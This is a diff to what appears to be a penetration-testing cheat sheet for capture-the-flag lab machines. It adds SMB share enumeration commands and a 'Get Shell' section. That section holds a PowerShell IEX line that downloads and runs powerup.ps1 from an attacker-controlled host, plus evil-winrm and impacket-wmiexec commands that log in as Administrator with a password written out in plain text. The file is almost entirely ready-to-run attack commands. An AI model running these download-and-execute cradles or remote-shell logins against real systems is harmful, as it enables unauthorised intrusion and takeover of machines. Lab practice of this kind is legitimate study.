@@ -9,4 +9,14 @@ smbmap -U SVC_TGS -p <password> -H 10.10.10.100
 smbclient //10.10.10.100/Replication
 smbclient //10.10.10.100/Replication -c 'recurse;ls'
 
+smbclient -N -L 10.10.10.125
+smbclient -U reporting -L 10.10.10.125
+
 > get Groups.xml
+
+
+-- Get Shell --
+
+IEX(New-Object Net.WebClient).downloadstring("http://10.10.14.15/powerup.ps1")
+evil-winrm -i 10.10.10.125 -u Administrator -p MyUncleLuigi!!2
+impacket-wmiexec 'Administrator:MyUncleLuigi!!2@10.10.10.125'
